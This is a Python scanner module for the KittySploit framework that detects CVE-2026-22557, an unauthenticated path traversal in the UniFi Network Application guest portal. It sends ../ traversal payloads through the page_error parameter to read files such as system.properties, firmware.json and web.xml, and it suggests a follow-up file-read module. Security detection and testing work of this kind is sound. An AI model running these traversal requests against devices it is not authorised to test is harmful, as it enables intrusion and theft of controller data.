#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-22557 — UniFi Network Application guest-portal path traversal detection.

Note: some public "safe testers" probe unrelated /api/*?path= payloads. The real bug is
unauthenticated page_error traversal on the guest portal (SAB-062 / Bishop Fox / Nuclei).
"""

import json
import re
from typing import Optional, Tuple
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "UniFi Network Application CVE-2026-22557 detection",
        "description": (
            "Detects unauthenticated path traversal via the guest portal page_error "
            "parameter (CVE-2026-22557 / SAB-062). Calibrates with system.properties, "
            "then confirms the customized-portal filesystem branch with firmware.json "
            "(and optionally web.xml via /login). Fixed in 10.1.89 / 10.2.97 / 9.0.118."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-22557",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-22557",
            "https://community.ui.com/releases/Security-Advisory-Bulletin-062-062/c29719c0-405e-4d4a-8f26-e343e99f931b",
            "https://bishopfox.com/blog/looting-unifi-controllers-detecting-and-weaponizing-cve-2026-22557",
            "https://github.com/BishopFox/CVE-2026-22557-check",
        ],
        "modules": [
            "auxiliary/scanner/http/unifi_cve_2026_22557_lfi",
        ],
        "tags": [
            "web",
            "scanner",
            "unifi",
            "ubiquiti",
            "path-traversal",
            "lfi",
            "guest-portal",
            "cve-2026-22557",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 12,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["unifi", "ubiquiti"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/guest/", "/status"],
                "param_any": ["page_error"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "file_read", "from_detail": "lfi_path"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/scanner/http/unifi_cve_2026_22557_lfi",
                ],
            },
        },
    }

    port = OptPort(8443, "UniFi Network Application port (8443/8843/8880)", True)
    ssl = OptBool(True, "Use HTTPS", True, advanced=True)
    site = OptString("default", "UniFi site slug to probe", required=False)
    max_depth = OptInteger(8, "Maximum ../ depth for calibration", required=False, advanced=True)

    _HTML_MARKERS = ("<html", "<!doctype", "<head", "<body", "unifi.ui")

    def _timeout(self) -> int:
        return max(int(self.timeout or 10), 10)

    def _site(self) -> str:
        return str(self.site or "default").strip() or "default"

    def _guest_base(self) -> str:
        return f"/guest/s/{self._site()}"

    def _is_html(self, body: str) -> bool:
        lower = (body or "")[:4000].lower()
        return any(marker in lower for marker in self._HTML_MARKERS)

    def _looks_like_properties(self, body: str) -> bool:
        if not body or len(body) < 12 or self._is_html(body):
            return False
        lower = body.lower()
        if any(
            marker in lower
            for marker in (
                "is_default=",
                "unifi.",
                "inform_url",
                "uuid=",
                "portal.",
            )
        ):
            return True
        lines = [
            line
            for line in body.splitlines()
            if "=" in line and not line.lstrip().startswith(("<", "#"))
        ]
        return len(lines) >= 2

    def _looks_like_firmware_json(self, body: str) -> bool:
        text = (body or "").lstrip()
        if not text or text[0] not in "{[" or self._is_html(text):
            return False
        lower = text.lower()
        return any(
            marker in lower
            for marker in (
                '"firmware"',
                '"platform"',
                '"device_id"',
                '"_id"',
                '"version"',
                '"board"',
            )
        )

    def _looks_like_web_xml(self, body: str) -> bool:
        if not body or self._is_html(body):
            return False
        return any(
            marker in body
            for marker in (
                "Ubiquiti Networks",
                "UniFiResourceServlet",
                "com.ubnt",
                "<web-app",
            )
        )

    @staticmethod
    def _version_tuple(value: str) -> Optional[Tuple[int, int, int]]:
        parts = []
        for part in str(value or "").split(".")[:3]:
            digits = "".join(ch for ch in part if ch.isdigit())
            if not digits:
                return None
            parts.append(int(digits))
        while len(parts) < 3:
            parts.append(0)
        return tuple(parts[:3])  # type: ignore[return-value]

    def _is_patched(self, version: str) -> Optional[bool]:
        """True if fixed, False if known-vulnerable branch, None if unknown."""
        parsed = self._version_tuple(version)
        if not parsed:
            return None
        major, minor, patch = parsed
        # SAB-062: 10.1.89, 10.2.97, 9.0.118
        if major == 10 and minor == 1:
            return patch >= 89
        if major == 10 and minor == 2:
            return patch >= 97
        if major == 10 and minor >= 3:
            return True
        if major == 9 and minor == 0:
            return patch >= 118
        if major > 10:
            return True
        return None

    def _get_version(self) -> str:
        response = self.http_request(
            method="GET",
            path="/status",
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if not response or response.status_code != 200:
            return ""
        text = response.text or ""
        try:
            data = response.json()
        except Exception:
            data = None
        if isinstance(data, dict):
            for key in ("server_version", "version", "versionCli"):
                if data.get(key):
                    return str(data[key])
            meta = data.get("meta") if isinstance(data.get("meta"), dict) else {}
            if meta.get("server_version"):
                return str(meta["server_version"])
            entries = data.get("data")
            if isinstance(entries, list) and entries:
                first = entries[0] if isinstance(entries[0], dict) else {}
                for key in ("server_version", "version", "versionCli"):
                    if first.get(key):
                        return str(first[key])
            # Flatten JSON search
            blob = json.dumps(data)
            match = re.search(r'"server_version"\s*:\s*"([^"]+)"', blob)
            if match:
                return match.group(1)
        match = re.search(r'"server_version"\s*:\s*"([^"]+)"', text)
        if match:
            return match.group(1)
        match = re.search(r'"version"\s*:\s*"(\d+\.\d+\.\d+[^"]*)"', text)
        return match.group(1) if match else ""

    def _guest_exposed(self) -> bool:
        response = self.http_request(
            method="GET",
            path=f"{self._guest_base()}/",
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if not response or response.status_code != 200:
            return False
        ctype = (response.headers.get("Content-Type") or "").lower()
        body = response.text or ""
        return "text/html" in ctype or self._is_html(body) or "unifi" in body.lower()

    def _page_error_get(self, endpoint: str, page_error: str):
        encoded = quote(page_error, safe="/.")
        path = f"{endpoint}?page_error={encoded}"
        referer = f"{self._guest_base()}/?id=aa:bb:cc:dd:ee:ff&ap=00:11:22:33:44:55&ssid=test&url=http://example.com"
        return self.http_request(
            method="GET",
            path=path,
            headers={"Referer": referer},
            timeout=self._timeout(),
            allow_redirects=True,
        )

    def _calibrate(self) -> Optional[int]:
        guest = self._guest_base()
        endpoints = (
            f"{guest}/wechat/sign",
            f"{guest}/login",
        )
        max_depth = max(1, min(int(self.max_depth or 8), 16))
        for depth in range(1, max_depth + 1):
            prefix = "../" * depth
            target = f"{prefix}system.properties"
            for endpoint in endpoints:
                response = self._page_error_get(endpoint, target)
                if not response or response.status_code != 200:
                    continue
                body = response.text or ""
                if self._looks_like_properties(body):
                    return depth
        return None

    def _confirm_fs(self, depth: int) -> Tuple[bool, str]:
        guest = self._guest_base()
        prefix = "../" * depth
        probes = (
            (f"{guest}/wechat/sign", f"{prefix}firmware.json", self._looks_like_firmware_json),
            (f"{guest}/login", f"{prefix}web.xml", self._looks_like_web_xml),
            (f"{guest}/login", f"{prefix}../../web.xml", self._looks_like_web_xml),
            (f"{guest}/wechat/sign", f"{prefix}../../web.xml", self._looks_like_web_xml),
        )
        for endpoint, page_error, checker in probes:
            response = self._page_error_get(endpoint, page_error)
            if not response or response.status_code != 200:
                continue
            body = response.text or ""
            if checker(body):
                return True, page_error
        return False, ""

    def run(self):
        version = self._get_version()
        patched = self._is_patched(version) if version else None
        if version:
            tag = (
                "patched"
                if patched is True
                else "UNPATCHED vulnerable build"
                if patched is False
                else "unknown branch"
            )
            print_status(f"UniFi version from /status: {version} [{tag}]")
        else:
            print_status("Could not determine UniFi version from /status")

        if not self._guest_exposed():
            print_info(f"Guest portal not reachable at {self._guest_base()}/")
            self.set_info(
                severity="info",
                cve="CVE-2026-22557",
                reason=f"Guest portal not exposed for site={self._site()}",
                confidence="medium",
                version=version,
            )
            return False
        print_success(f"Guest portal reachable for site={self._site()}")

        depth = self._calibrate()
        if depth is None:
            reason = (
                f"Guest portal reachable but page_error traversal did not fire "
                f"(likely patched; version={version or 'unknown'})"
            )
            print_info(reason)
            self.set_info(
                severity="info",
                cve="CVE-2026-22557",
                reason=reason,
                confidence="medium" if patched is True else "low",
                version=version,
            )
            return False

        print_warning(f"Traversal code path responded at depth={depth}")
        fs_ok, probe = self._confirm_fs(depth)
        if fs_ok:
            reason = (
                f"CVE-2026-22557 confirmed: unauthenticated file read via page_error "
                f"(site={self._site()}, depth={depth}, probe={probe})"
            )
            print_success(reason)
            self.set_info(
                severity="critical",
                cve="CVE-2026-22557",
                reason=reason,
                confidence="high",
                version=version,
                site=self._site(),
                depth=depth,
                endpoint=f"{self._guest_base()}/wechat/sign",
            )
            return True

        reason = (
            f"CVE-2026-22557 partially exposed: traversal fires but customized-portal "
            f"filesystem branch inactive for site={self._site()} (patch still required)"
        )
        print_warning(reason)
        self.set_info(
            severity="high",
            cve="CVE-2026-22557",
            reason=reason,
            confidence="high",
            version=version,
            site=self._site(),
            depth=depth,
        )
        return True
